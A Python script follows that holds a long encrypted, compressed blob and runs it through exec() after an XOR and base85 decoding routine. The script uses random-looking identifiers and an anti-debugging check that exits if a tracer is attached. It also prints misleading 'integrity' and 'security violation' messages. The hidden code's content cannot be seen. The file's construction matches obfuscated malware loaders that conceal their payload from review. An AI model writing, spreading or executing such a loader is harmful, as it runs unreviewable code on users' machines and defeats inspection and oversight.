#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
import zlib
import sys
import os
import time
import traceback

class eyKiRGyP:
    @staticmethod
    def wCzXOjeP():
        try:
            # Check if being traced/debugged
            if hasattr(sys, 'gettrace') and sys.gettrace():
                return False
            # Check modification time (anti-tampering)
            if os.path.getmtime(__file__) > time.time():
                return False
            return True
        except:
            return False

# Encrypted payload (modifying this will break the code)
qAggEsHM = 'x$n?1@BxAI<nl~zA<KtZ{IQBNqbP#d-?D8dI;ZCq>#fQJ#v91qnbZkgIn(c6`;Fi@um!}J{?Hg?X^`s<`SZ;f_HFv=%(G`&Hrj#)mb%;ksxs$?;Nu@AImhP-mWY=&-5bD|+}US-3)PiOj=a<g*J0ZIj=mE&6RfUiruV>kyLsH|#PJCvale6hkE+6R%wU&>)uCG~dDf^B<FEL6t{8{u(z8N$0I2svy|<4S#v<d$<kxj8FOioAknrw)?mG78;kju@D29+6iRbkU<SB{AoZDM$8Nc{cpQ(`_{4L(nkga`MZ=jwAs)>hT`W*M@$o76L2b#Y~qlVHS-5Te^<m6{(e}SY4jg03t@fqg+*Z)W|DapE1wCV0Dpnivx|E_y00otkzf{fQR(qqhxp0Z~^Ki!&Zmh<s$*E#&g?AS|gYsi>Z@wC_i&NteXl&)?^Hiw`^o&TPG)oPD{n9KlIB!Zd|jN`#^@e7%Xf~f~50GNYUy6={J?*sUrhvs)VCcm@^s^{b!)i{ON=-*Z&DTRehr18TvzZr?r?x$rmVcqR#wesf@=4;36)xdgM1gzv%j)apk&I;Xx+`Uy@bGCsL?(p~!q#K^m_3BGdcc_bJij;&T!Xm`a_T&{TcB1=Mn~Lly{TtEE-r^BW4Vbt>k&XIm_%(--i=$XnXNR*wz5knQ`eV}c_V-J0636X%l!E#N*=h8M>a%kr5!tK^zmty~;W5w4#<FrO2#TyhtD(wj<#EjB%hGsk2$A|r^QzB&-YnJJl;mqRVvC>>jEb8rzkG$v>a{{X1IWF9s)vJU;so*k<M%>7GqLO&;gQ)esU(uyov%(dVcC)l|N8SJ`X7Xq<L(P94Ai1{?XvD4y?N)G=k;AH7>1bzk-zb0=6{{_<FNoQ0gj<~@aN<t|2)}&mhA;f3YW1Qg!#*Sr!a#1iTDz4IJBV{@0!zRr6v2y(bh+GHm<cnkMD^wz%BdY)c<Z@Yq{$h=7onG)Mv?t+u3(;bcmpPq@$W^=mpK-(aS<gWU!Z3o}1<b#2)L{!pBEhAIRoG|LDpL?Gfk9p1pcHBZ0GGm6VBY(>{=d#K?0=7TmCU;=bf_#Tw-A*P%viH<E`%<Cv0X?Pb>J-nBwzHo)q4g{g=;;4J#(=<E_J9=PQcpp@kst7yj6{lNxRXN<N8^OyP|_5j_I*{)(HbhV~T=#s*G@fF18_@#JmF07SWj+~DW>Sx@6;lOWX4Xle>i>A|g+9%KT=FfdW5!0J`f})xr?0?qpj@Dmy0=U0Ilj+(Tqyyvbg|lCNC!_Ia_vGO&!F}Q0$*5;0cCYgX;^fsA^A?hq<MAJFHr$>;p^2V7=Ni(H<J3TCd&!q(p5e$G_#W|}@cI}eXNIVE?11M#?mf-Xz}RbV7pCK4=BVXw!)oW|iu^`sC$Nwf_xIa2)H&nN%BERoB*lsmsEmm?>jme`@vsnaI*FznqlMTD>KW4B_~1q(YTfP$sPWARttij-&*cUn9>tnewyNoB(LdeK+p9@81-XS0?v|Dxu4K~5ivAR5XV<V)poq>6%z1?0{qJm7YLJU#w5^&c`y8J6<HB_{d7HjXvXt*I)p6mG+2|5)C9Rzn`?>oT_GgKg)9hm-WtgF7setA^$QaRzhWTkyZM2wviR+plvI^qZ=gt*ZJBE-DqNv|;=ODuL_pWm!Vwdl3t@E7|sW8BW<f?djGu4+-qonL}@MOW`g7g4X8o9F+=&8nT$3NJO-p^xdY@@S9zoyeC|7@M=>EIo7W}M&@=JV%0^d!@Pil<gb6tkR7llR<t(hZU0p5#U@F2DADx1fs->@?){pY{+(8MB9Io|@$?^Ai8~+PrQw6vd`#zV*;P^nd%y+@Kk73#RNEsHxm!+IjJx)A>|pbBDYb<?`-3#R1aW|M+xi0gdx(ii7oX{~-JNo~s5}Ad#<cw)fvG>LmSv?x-DE9L%6c<Mz#Yy=(u+*3}Cl5xAF0jDnFS_H5$e!rf><B9FaJ>Gqj2pgi}=iRFA=0)?SZ<bsqMuWH`!>aa{~f2E@uw}#ad`X$`$*TP9`afP>hh>73}&@%Ru$H#wBHl3Aaw~EdpqJ7zr-Qi<?Ft7Uvqov|0;yK)phR9qw3XFzXs{Pn(_iN7o*v5GyB9`D)|Bc22`wNQTk>D6CHHw=_kfz~p*f9C!)9N2GC6TpMm8SD?-WT)5#qbD05|r;=`R3bds2|M7`rLD6bD-g6m6p~F;A-;j*RL9RKi;fK@tx!+zb@X?n)_HI1;Vghk+6XZ>~GlR#kB`gHqoM8gRIObwRO^(#rzQ>7q0Akzwn<K!7$s!-MmD1D~#Y;gN&4W|3CZsiP0Ww0+OF+wuX`<r4HSR_osYO6u`b{sG{2h))W8Kg!~pYKY-;3>-w2F+9a99hVffU2(y88fU)%x+zyh;;iv{V1kvD8x4gx3vK#s5?BG{jJ;(Z4vE+dQw|C9q+pG{uF^Gd3<CE-YwH5iB_1h3(c%Y44wD9j{z8%@%p1lrpC4uZh<A=?E^dQZj<@<O$I<@5qjP>sc@D=@t%*H}=bAz>8fU5Kp#6H-K*}Op_E6js*u8ors`#RVBl(9fe8PmRFjp*%W(;M9Al<f&`d#vmqpyQo1sAA^a{K<1kAHtSoq_c!@(i+E|lA(B6VT1DsmE`L)-#>}o;oePgA;S4rmyq@uy%Najg0oI#JD>Vh<%E_W;uxLB;<E&49@OD~tBjl-tpnHA<oXeDdywvEo1yw5(q!?5;P+ld7P5?Iy7ATo!*KK5{{CYqJ)^N{l#j@K@?`p#lI(RZ43fA-k(J;Z<s{w4+URamE0Ozkh>_C}<bBBE|Gi~$3zCyhrh}XU>S^-!_}mapIjHPGn7Gqs<29U@-04e6ZPlwnqv4f#$v=Xe&ZkFC6oj>S>+{oc<sQiThVm642EV&rnD>D)!v*A@obGZ+bl90jo96Nk{%QM$&&Faq6ODsgr>O5@`7M{>#qU8RJ=2J2wW#p|uQ`d**|2+ZIEuar?C{BJ#C7q)lh0dbJ&xypfP(aC#$c7+mfj3iBA51cwUzcY>KxkI|D_Tj9kB02m-FLss37e8=(z}e6QP0~yZOpzuOW@-<Ju4;KEA7Rrm6B7t|Qu+#;HJV2iW>^iNA&e>H^-!-p*<-3#Oc0xQ>Q4`Ej4$#@7He0L$!GuB!AX)oF>`*`Wnp4XCJhu>Z;$!*HFz$M0u*VTXrXp10Qk!58_(#KC@V2Evp`=i~Qq<QT=-o!fj%CV{^bn1;v;@P5OZ<lG!#Dwc*rij~?V-UEZ1i>efI0F$^~@B5G`s}1ev@B2?l7nZUafR}?0^>WtZoX$>N7u2a`lc)7!%yHY9jMH*u1&*3Vi{_RH-f7qLhtPX2HNdA>h4k72=r@h##lUJ@BB#6=uK(W=qdn4u>eNSFF~Z_u^SHuq+JFA<+Q>p=c#7g|{-wfu{V>Of-}_y0cB1DSg!JiT=WO!W>Y+*_B&?NItfu1~;vt65*{1+X1EH=<sHBiO);jr^@9_*q2%MA*;<m{I#yI`n&Zkdb63nZ3qww|=p(O3{n5!H`J%H+0qx$P3&JmE9?W<Z=63~%CkE5D7?=GC&+U0Cd4Y8pMi~5x}>ll*F^`{a*D$%xnob>88@E!T(+st`3ZpHHy=<53$*&g%H*t>mKbJV3uy!^`>*c0sF?(j)@Alb8dxBt`t_5#qso1{X0cY?1~?w9Br+ZvwepW75C3#O+9o%i1j;4j>nnEw+~dAILf>f_E4`a13X$lp&-2i?1A>FCBG;U3)L*UMf!K7zSi>HLds!7_v3jOK55E3%(|gYd%=&ko+`@#Rk^bg`pc<&5NP?Jw^5%B6IF3X`20rjyMDy9D8%lD+^Y655$otCf)r#5>-YhwgePCEVc!pp^R+z75*k!KzjxI<>Yy?EdwBtpdcr+tf-aC8W4#iI(#m&;*e5lDkDIV8!KnqyCiw<v+>E`{+b+Wy$43=7Pp<;%3Q@+~fv3W|^K<zNpM>!!gC?$g>1hJH?9(?6%x{;sc8M=A<7rAElmqik5~H@jHa_`^;EDGqsRif|BPVq#=ga+~XU41Bjv@@{yhmyCj|T<>_cZ0gk6ii-YSB#14wZ>#<BpI=T64nTy^W(--63!~Pg;e~Y0MpXur`t~-*4{M36{VUoB9>c8A_yC3D}@8Cdo8Nad_y@BL1?-tbFhsb_$5U}b;yOH`j;|0vo)wKz1E8Me4?(gp$qaNei?yessIH2HR^MUXP*?ph>@!fn*9Epn-|LDgHuolM1;`0elZr!nTldhL?q<6;skkV5vA&rYfgu2%X#|4Il`KwzsB7>n2jfR{p*=Ez!jN5u-3$2HEq@v7Z?jqK}n(GchVZM_em50VK_IZfh-o{TsYL%)$jE46N`D~tn+ucDfdajsxlc2zE{$c-=g{?zD1k$U0@#c$dpc0?v<gFA(9iov|z5Ui6@d}Tg=)D<FE4kuMwYilxvmk`w?cQcoD%Y?CxAlo@%wy7u>&SR)B!+`i_x0{DsTkps+UN&Q2#f1Y`LDrl^f%7(!~Xzb9o3&yyO8%N%pL69&F&IVX40r$@21%|?-tOSm-%}ncZ%v^wZ85g`DM+Vg~(-17P9(bh=$uf)ff89>Ze|1HpQk3j_KNAt_;JP_wPkb7^<EG?z@#P@;1QEivJucc&U(TmblJm<`etY;oVAWV412LkCONor!?;7;MjU@IggTLm-K-=qC5K7<K0GFFv^v5{(|9g?=Ah_-0&1AG~R_3h>-X#=0BW~jQT`HYn6lsot@TW+%>@d>!DXCAEkp}tD}-EwH3pZ<G>M7W|Z_*_nMkB&usdV?b&QyHm{3*|BCSrrGMqf&g2YfAgzQ&g}8(|{BeuMnbmqHXULON`-<aa&k)+)-@$oM4ASc!x~-FN_5g&Hk;#5|J*KB<i|F(&`3uF0*t{7_d64f*lC;?qs1u#r&*}y&Hqqf0gs1uv_;Q@i#K0APJH+H}mgv+4{TQF$$lDZdBAAOFoQjujwJO@)%cE0tY=rtvzM{o4+AN6v#`a!KJ)7iF<>uvLzGT>so6lfc7K4*aySL35<$uA~{L}<oX4;i%`I??FqGEymg0&t^1CgWv?1{u@$R6(E>+udW1j)1v<Eg@Ey)nkr+3rR>E|~Ueq4MJ&yELAY#p*^#W08|Yx}2Lo+Xv3Xk=0{gH?q25tc>qA`Xm3zn67#*W50+VoucAt{4VkN=GF#LX@Z7GqNKqKw+oTp;=*YxAJY0%;_2gK=ne7h`siv=dC7`Jv#`u&&pn6D?Aa7gYSg((yp{VRwG{Wo)xJ!B0p0CEjkSpat23S2+4@~d3a+mX?)u|8^*rpI*X?dg9Mj}?`{UAR=XK1V=i>=gbGhvlyqtt#tv!<KoV8?RE~KRyzV(wlwI1J{*Q;JMV~gxdv#Hw`%sGI^oz4kr61#wIvbgsY?rP26)vID#5}K17`TYGi&mY6m%h6v^FU9(Q=Kj<W-#YgC{nrqBJCKqLuJq-3;1%45^}RweWWI_)sjBL6^aG2^l>SdG8i$5rzL&#)@fm~qng4P&V1)R1g`N5uq#4cmhx8hA8JB@(tgw?|%s1u!@VP-&Fo)%Cy{Ygbt1jh+&Z|=|5y$6gx|Q2H{51RC-1tFb1fP@<zmuB`y=%_L;iMH$AD!V0wT9j&+XTVh@Tqe)Hq?_4^N#Ee<Yu1b!rnzj2a1MV?1<KL<_`Ow)ZKqMGRLZD>!y@xync-HiRo2eFtfK&g66<yr#JM)_SP0$B%k6~nyZL#yl=tu;jU?U6oad3r-Gg>?KJI}-t2mDBA=&0r}gP6r3RUV?baPf0*<;=w3nO$@M)6X%(H(<HM@-(@$dXQur0*o!lywlI)a!Oh`aD;^&OC(jQ4nDFVco({Hf+DyC&|C{r`SVZ=sk3j+)|rz7g}n=)MqLXO8qkt(U?DpkUvV$M$Yw5U~3M=!xEN?E~@SpY2>s0nvzmp{{`(^B?}f%DWgQWzppp=l;@p<__-F-THkfW54=p<(PvU!(q_xlkP<~0KcU}wTab!zc-E4$>tg>8P<(%xv7&qyglLUm;4?%7qz2f@w@1J$OO&Qk>v+{J*=opwCcrc%yEJ5>iKnMHMf*O=YZQS{Um|V+@M!(5zLTyl&P9zs1^K#!TEY!IK-1xmy5^}qh`+U_}ybKXNs;Egr?jW?r7AR!m|}XWSHOxv$6AcyJOXe*vDWhca@kCsrm6D?qrSS!RCERc+`_XpZ<^}rWnEdndo0x1A?7Tw}QY4$qx9&`{)xUYl8R?m%NoW{2SuJ(bQsYI?}0ky6EpdvOAgO@W@L~ILD?+iK+Jl>=Ngbhx8nLFu=ZH@ty52^>>huk-cMT9iO35kC?<h=5N=Y*r{_OE}NDUgO%Ge`2fSo_q$+fC(xc)m5bsj({X{|``uS5E4ZZ*gSqlBvKD}v=Cc(wVuPbykG_@~@E+st!uN7#Fp7sxgtOE<rWE3ooTXkzDB1gCv#HKvtu5V}*w<WV27-e~fVt@z<`~-blA(D(Khm2Jv*+qM=Q;k`k-KMo2(RiA;feNg$2;Jglk5~yDX^3gn}(ce>tKr3&e44`V2pzjtFP2H{4?R)*USzoAgQKzrjy_iyClTT|MU_`1dxLmtoqUj-8=gHn66D;JBFAGh_B&u?=SU|!tQe`5RRo9?(vH$*L<In-ue+|6_S+>xP#L&&I9V{h0|YR8H$<|xwh{Tr+N3zg6I}JHH+^Fq_fBc(rARxn(=Q%5P_LotE<T-#1o$D=-ESL9JH8vnyiEa_c)!(hpKr%8;!DhfR5V@)h&&LmezP|610#7psUgkyKTvn?)6Jd8i({nkGjGusAAsiiKA|36q&OdvH8^?#0JyO%dZx79ND^Gx}@d_?q}cQjJ*X;E1~~Mj-Z(XpfQWX+uKTT6|n7Mx0``vzzXr(mfch=0I9om_vVm))Fal}oYfwBV!NI~zk~W3?=;Q-=G7TfbH}WG?SP3Pt~HhHin9<{I+&$j;+&5c^=Z)m?93Zq0?6b}vxVq>@Fbk(@!}n0Dax`2yZ7)M%n*jgg8N{8E0mX5>$K(%zaiAv#HD*<IJcS_sPy(Z-4vP0n$kr_3$49Z=91uTpaqYG&Amc!29~i_nB)2)wP}Nq@2v%P9fh?({Djj!;|`76*T-dlVb<Y(|Niu8^*Pn^p0N}<F{AfE^RMeE{S}$p!O#;$E7h7Bt@h9w@NC@So3e6u3#0Qzp|{F1pfTRbmfHv{AJX$z`@HBg#s!R*_0|(WCeyuWr-g?pvLe~nhtqy|G=-Q4tfJd8!xf8{#p?(p0>%GHoT&6Pt$ESkiRf*1c&Ol6sJn&=wI%fbj^J8I9m%E+gq4a5<Y&V6&ZtmN2a&aNl;PzA#wYap#p4@Zf1<W!<E`LhwI}({=Iwk+B%hKIsPKan*kqZP_NPxi7@3eyv8&k-)i8tG=+Jj^DWanUh?SQZ<~zjo{rW^>ZI7=NlA-1x>H(SZj?ZRU6|0$gkcz+^w|tT5>7Yz@9=5)6vg`DIz68RE)Z<`d7OaF%t%c@o#%;*wo2q4V1D1w;iu0Na(gyd;#>-w=d6ldd<gV0Xt0VvRlGlG&VuAT=nY8p7`6$Ba!|Zi`Dc68ql$ZQ(t3LJA$;}LP8KbjVqpH+2sDI(f)vQb}71Hwuf~4s&@MF#8jQboc9gm$EjG@jX_7&yKng0@VWtXo_=z!mE<Zb-a*xCSADBbB_qV&LP<bTti`Tqn@dWy1Lmgk2y+b@jljLi#S3a;QAp1g=IuV~+fgx3HddZgt}@R0gE@oe|YhSye52&3Rln}gIjuxQ1_*y(;p3a_L}lAOQ<;4smbn#yxYYP6YN`})}(q7I6UlcO9<8_VN)>aN~uq<x%~)bmzM2$i*c@2T4=?Q($Ej;Ix11gMIApZ}j8)e-mn=hsIp4Wh3Z>htFi`6BMcm-SV61=yGdpPY&nvmuYf_vl-4Dzk%EypZ*Cr3A!*@U?tJbdaf8|D4)3@p9+YilB9BB)ElcqlU$Q+#QA2!{T#K6_BuVy|~aa<QL+E#Mo<eJhY=g_pZ-o&VBlq-tHBAV~mIlxT2RJq%wuW?W{s)Yn`4$l<=M%?tc5_{PG=Yf6Kc~xw`Zb;ePnhlHO^5HKyuf>8#H^+I@}m|Hg7n8HSNok&Mp|)D6^?lhXw$c#48k=cV2wzA4@9hV2C+7O;z5oc!Px_Y?Gm<o+9BcBuMvwWgl}&SCSMj<XSc3xl6*j*8<b;A-xH?(<$DdYZa@<n)0q!e{ox``idL2a&2os=oI$^f&IE>aGrX7qFjA@QdXx-v;xBnbm1=CAGR{<ox|8pcUqk;k;H(dCaPAn(v8w^*fR8+vZ+O9Hro7^QP=_*<p>}?%@_TK9=Q6mb{7;st57cl&wN<Kh%X}@3NU`{C&mc_VET(J&CSiy#L`3`x5?;-RNCb4Y8j@pQDBs%yE#}{Ouh!E{cN=o#e|3#eL_L`?X_9Imm={n5*nF`hS<5hNuKhG^>;cqqy%M!8VP~`MzC90>zbYlcnk)!ENiA<-k#8G}z%#m-6^w$tLy3gxr2R7ul~CjIe}q#4+>y)80aL6^OM_;=b|@@?y-;{>^(+K7gfsil@L1_ZZpwg6?v2G0fy)qwvya`FV`;$ju2WHmKuBk*MKq&Jf**nV}9!V7b3*?Y5sVsXoe-;msH*Vw3s_=#}zhvLfV<%*F_EX3?s2nYf2+-aGNc#Hm6>e~N`w|Bu-q<QjqC`SpHIF|3zfw(G$!)iKfNmcm$8E{BGA^ZeBhux<8<{IG3f8pWqX=lkm!^mm2bn$TKC5|6kRv+?gK^ljOQjK^$kA>FbBsEE)O>I~fF&+<?@0H(if`>ywL?*;Xm=*n{{0Fd-Zi0YXRvta6;p3)kA9-^3N=Zugq=Wz6m%gzjLX_1;<{)C)=p%MFpk+~2w0l<V%prhI-zAoUH<-1!iIl#P1pMvsn&mjHCndS?99o?5(;*!%I?E?1Dj;vWq3!J-T<ed6p%sG(2%i$1aDX5?xu;bP`#0JQk%dU4QCBKsggqp~A(?6e?=;9o0E61B0gz3Tx-7f0a)c;vLFsPbB{-XCi@H~pg@U?q%0JM}x{+xso`DvAf-RXC8VW66I?3(N?sTP&r|IccF1C6V6;f~u4p)-KthqZls6pi~!iSUaUyED<(@y~BXVV{B)x~behuQU6a`|<{LWw@G6gQV0qym`lxo$3~IIJx+IkN?Ui#%+z>%CJm+X|VrA`<T!e*E{*)$*)>@5ry|i`<(4$>Sc-a-Lo4nF|3hdyoTBc+%=z-*ry9?1)H5zi0Z<B;|HFEk)|JX9h2fup6lUv;}+qNo~~1KJGh2SjGCTf&KS{znxtGzca^k%o0{Sd!UWvkn5#;1X{EPp=&^w+#5Vl?@yBj)G05!&zo+Uu$YFuz*RWK1V3*<r=%nRo+bHLsnf?=W0K2hM<Nw7n;{f%=kjOzbV6OjPn5D=n*&^-b%DGf>7_pXWndF>j`Eljzz@ZB)Ytf`&{(zJ|uNH!l$gFQgE{>a6;^^is%plU$<IoOnag%{xpOfcj+GF#DlKe@31IM5h@%4cZycgu#i^yCn0gb15rmgJ@;B4aZ!N&$Qd*73I_v6qPpd0bjhNMngGuo95s)dIc<zmF1__-TSCYPxIpPlq^^cc^T|G;>1CWL}v?W6Z{ups1y!Lb@mVTY@FmxYQl(`)|P>gySE8HbA>gM{lf_G0n-llm4^e~Y{xh5qa!+yU0s?dxtU9k-ooi1vqj{b1vtoAhQNVuZSPyoKW`#1?_T<*i6@V6Cn}<$%Et_%n_3@5u{aci)8&nwRJer55v%_3&a*W{|a3i13vt)@zI4=DiVNae<Uhpn#b$ya3;u>)BRY2ae=bqWR$n_%;0P(!O|BG{oe3o`jhlsTJGR-S}5rB(e8VzKQX2)eeP|<;)9BV4&@1@`v~=!eZ_E#m@$IAfu{&j<3yP?{V1Mnd}E9HJGV>p^(%b=Prka>Edc;K9`hSmg&(T!UyWh$;m@H8kd`1n5LBk)@PTE$@X1bc%q|imh|Hc`fT9#n(KT#ACsXAv%Ba3(J<`D<JJx`W`(g8;((ibp>gh>;^0hLZkd)#wu+B6s|4BH*86EdW2dM<spp1p(-ZsL<fmp(1-0pE?u>>o%r=sf#Jfy36oHjMvx?Oq$0hap#kqNAG{>=3<Aa88qZP%3<nIT1bf%UFqN~d<{1xhv-|`e?7~Qo=?6A=Tq6G7X_|9TYZHl8*o06Vv@EpM0)w^LYVT9sNyMUH%&_0*u;>`we2GYDn?uF_K_Bg_r>g`ci2!^}|l$whGz-8*?#nAv(Fs<)qnSkag)Ek7sk-SJyCCa^3uKCa~rg#79`oe8*Jb>gLf`^7Rzaz%c(!ydj1E{}DfT^D`$a4R{*7#RJ1Gnc#@r;Tx;wsPH;-nTS8k@XI`KFK<?l|R}`s7qdKHZ=P<NSnh*$tiV{=iUtbGD@jxUl78#5UsZnbk;sd&HtusQ#WI`eE0N#j8U;D~IPoq~Y>4t##yv#pEAz1*ec^gox@lyaC$D#i4#t1f{26=<1z5)_nPe<NIJbV#SJYujtAT^m+b=g3WwpYRkV*jgIC$q#BBf%l&60c-OWCvb_6oqyf*+m#%+ZFpKF>{($j$tuo*B*!@pj1HR)?<DmF*&T7f|?#~5H1EHxL@3`wC;u@9Kp0#~iY|5k_j);{!@eSjVnEVNJE5(N$xRlr~$ufiLk)}>b0olF|m%r~1-)7tL*4Z3*bceBSy5!k5>I3)wkl=JFA+fGt<&3~L-)!X1htOP8E0}`|j*G?+(++^#`}|xfZ?n8el%nW7?h4KN+wFTPWW>C3mi3S``v&^ek;@i)Jl5oHtMb)6$UDu}n*UZUB&?!G<(B++#T1;B<h@*52A1k-|MlW#`Z(C&?A};PZ?l^Yru^n}uRen3o6B^1CxEw1yNAwv+7pVOo}fm26w8@>u8YiN(|(fc#qeMz5s#m4rjzd#(GBg<_0VWn2i~PffcMiar3J><_r_~_2GxUPtnuJ^$vT7F=B-F<3XQsYpt$%W@dMZFn9><&ajcYW|G%1Iq7(O#!_i2743V^9grtLfz!aXE@YG#jBixd7<Mq&HqicrS-_~<ZdAo`W@VNL0#4?@#hwex%H@BK@@3n*;tuo%h{orC-6qmU}`~3Yh-Zzo?kjnrkdaeI!|FGY4-V=e{)BjOQXOWj4^7ozy`~}VCnc{zHFqYy=vV@ipt9ShB#K%B27o~w5;lJ+`+ajNzm-9<|X^ZY)nVs8w-(`^V{`(XxYrBUM>aO@0;cxPr$?0f8cde%hh=|g1%y0J2nWb|oABKT@r>E&W?kvHbkgii=2&uGhpZm`d^C$A;k;!9NH?X~Pn6i;==LL++neiMW5{{A-jfd74^CSG>j_VwIV9T#h;;e>dr3C!v$j}rhZ<exug|wbE;VtKdovA@?4V0&B{E3G?yd(Gg!NE^F5WwJm^Rmel{|?gj%=u0!f2@TFlZyIn?L6C)@1qe)V43M!`;f{P^I(zT!2TX_V6*cQ@Au<1pc2FT_3e2s1k0s-uBY`o^Kj$X{JdCB8mE|5?}5*G-2>*@#j|=)Z;pdbr}NDY!Z^|S)A}7Rf0gY8p}6`i*(T$X`mB9vG2gvusq)b()iu}b|Hx=$IjNLlvh$B~y$j~vo%8@K2#xktxT?rA)_niu%gA$Rdyt`bjPsE>>nNS##=%Q>8;H3Y;h6Jl<~x<h+M{_<ajLyrySAGu_BhJx!rWpc8`R@os*UD%wJ_BFkfwM(WQ&V><+8yf<37fj`rTSbY?ZTX;-LI!zjxn{$@T_2JeHqb@b8B;q!87Rn*T>H1;D0$@PX80$qK@ng1l2eYl^>0?XiIfq-2Wb%>8s@D7))lkc`9)ziZKt=Hz8(B8T&Gv$y*z*lYZWm+@SGV}^io?uhb!`#Si*_@i4cD~<FW?)=Ol@hqMC%jga$FOq;%@uSpf^dF0d`{8&jYlh=xr}4)${V&3hz{_nsd7rokf}DsA^>OCo`1@f{2GgPhmxtyY|8ero@A*PC7?!F<nxvCv?huff$)HYcXNl%im-6~<qdb+Bh0AGJaon;{ikrqM?k(cT$-#AScB-#n@Q|K0_Z5Tshs*?IA%l<w{D{FJz;*M%$MgVIG|`tt?}*q8w<yk+&evB~F}sFcypNA8;VH-OpWs$E7=`9Qg@XETw*cyz$+>cSI>(J}py$Xm;xU4p*}xui3WK6mnTCpR*lWhv#j$x@9)Of#>4)J2-6fUtn5YhXAh@?itgVzd^#hH{^`jYNJi?G3s^*X?)i{ym_@_)P9lxY|<%pXmyETQz_v&a*9?^nj=#ZNt>NJho|DY9I3$&a-<L{aU(qQ3_``%edd(fv6jl0tp);`k5`0E;JAD6gHubrJ4`(u}$!>9&#d#ssIsIBsOz#PTS*TzFYKf;!8_p0`2z;Mvd+UOK*8kmM3pNo-g`6=V?hT&W!Go1QMzp3mwwSDF8gyVTGC#<R(g_P3+@iK(;#nX3GKBAg#ll|@}s3h|Jj_*Nn7J~6k^ZSZ1uPxT^)8QLSHjlOpm9Fb|w>0F#+4mDZJkq3nz46Te+&%Nq?%P#tC)1Y(<+gzt!)E2)%JdFpJF4wnyp8=6=Q-Nq!17p7Y|OPomGQ}J?0m`Q)$#yEIEs=5lz^QJrE!&t%<2+RWVMO_fSS`A{|1Tr>-|G-BaQDGq@svv!!ggm*TGIM8Jdc2tNz?;&NABip2kyYC&#x;_okL?-fQZTk)?Hc2D9{UtpAcb_9MW?`TK8Uf54D;?DF3N#3t<O?*3(529=;xwWsrD+yL;_>f3*IHlM6}n3dE7sX5*ApY1{;DYBzf`M<>ytzqZj%b_1>ZJqRUtFYP>$A6EV?9~xwWR|*CmFdL{(iZ&P?W<8bWt*0Mg8Aky_zcjK_TzVIf0UO;rli3g&;tMA#@B3QFSCqzx%TXPr9afw?$~Tlf8Dibyrk4WqB@I^>+DcV9?R)-fRu}O=zhW6*syCMFp{58o96Ws>KDxalk^jOZHs|a^QeXiw;Rogl=^O88?TcNg!SJxupZU*=H*pTZLz0ItM~FM#B0;l%F|Uz9Mpq-im>4g`vLaC%=1}DZ-R(f<G9xV<sO2~@YZuQY>$~3v6#mr<8|5Ugxf$`J)x9Fkch|yrZM&Z=KFXoF^q-=wV{+hqbKV4<M0VQAi$q{t-j?8z6$QkjOcPoafGZE=8)qZ$zq)0pVfR%64kyy?)uCRyDyE;$mDZbcc}Yjll#~kwP5DV$<Z5VF|?z2zo6r3?IMfBnD7Qy8_2m@jOUsT-a6pai||H!A(plduZO@Cuseg$<Le(M44mS8g`LYZ^9A6~|I<uUAC{bX<AmTjsd@N;{OlMg2fu;||BdP~qi_C%-^xrp3c|Y%jQ8Vm!8VuIjO}J@C&Y$Cin*F*>@543*vC$L9Mbbw>-FUyr(?v1{k3W}Ak?pF<CN4DuxQET*U=P47K67zf}_A@vSZkU<H~4qHno#Nv9X*gvkdCQ>Yz?`E2^*wl>F>xyL_FR=KW|a1Ko&EwEB=fsxF6;-0w<yW5l{a@|F8DzYfXc*XTw$Ii;)!^1RtF*lhHh>iv9SAJ)ADn!3_w_AP?!&geuUGQ_@L?u7AY{%_lr;nG@cdXk1mskY88vl7+U=%I8s44CI~@xGG`t~}tMlHPkfc7~;Gmg&_w@iKznp4dTq9-50{j*saJp)c^B+`D^OJhiBJjkoR}?P27Y_x61}JFD(Y<doPn@F9T4)#4CY3dn#K^Qh=@yCZ|e@Yj4#bk~JtjkM`%z7zG6|M_MqX1C^iy1U4E*C2|~pVmZjXN8_torBG4$A6HS*7sy1479Kap{1D#$PtF<koZ6>ESHFKh?d-9qzB^0;Ppp4Agi5diHO+_&M5x$&)-8UGLz+Vx2TyZ!yDb0@8Nq@0)oCvo3qve-FJn@+^Bjo1D%LZjDXh@!F7_!<*`mX8_}=;im{w0;UeJB?#O#DIj);$jIGHG{~pZRhQfb#Hl(CPn(@jX^lgvk<;+ff1F-6U?Y7Q*(IM9I&(B*_cc8a*q>$k|s&J3lhTlbd0<x4`sp*?G#y0xr@v{&pB;51`yQA-L!f~JB;p+r-JKu*K=#9xb#~6~s{P!JPdXlPQx9i#-rvmrl-_-?iGSmBLp!dNH`!2x#%BXpHA+D1Un4O$&`x(uX)csp|A>5Q2^W=(T*(8te&#)VG3xJUb`RSJe_GH9|!25VCJBNx|s*da}uOIW|=Gjw6ADE33q?VEz-Z_VdhpSb1Hjm_0=#Ii8=q2{h{N)EU2aw}Rqxbl8trn8N+P)BD1jK{}gZY_g`gers{Kf'
nKJVGgoR = '+QOn*mQ=K?ub3?#QsL4q'

if not eyKiRGyP.wCzXOjeP():
    print("Security violation detected. Execution terminated.")
    sys.exit(1)

try:
    # Decoder function
    def HDtpcGFa(QUCrzcjB):
        # Multi-layer decoding
        mXCmRwKW = base64.b85decode(QUCrzcjB.encode('utf-8'))
        GmexShQU = base64.b85decode(nKJVGgoR.encode('utf-8'))
        hdorfwER = bytes([mXCmRwKW[i] ^ GmexShQU[i % len(GmexShQU)] for i in range(len(mXCmRwKW))])
        gnTDKsqR = zlib.decompress(base64.b85decode(hdorfwER))
        return gnTDKsqR.decode('utf-8')
    
    # Execute the decoded code
    exec(HDtpcGFa(qAggEsHM))
except Exception as e:
    print(f"Code integrity verification failed: {type(e).__name__}")
    sys.exit(1)
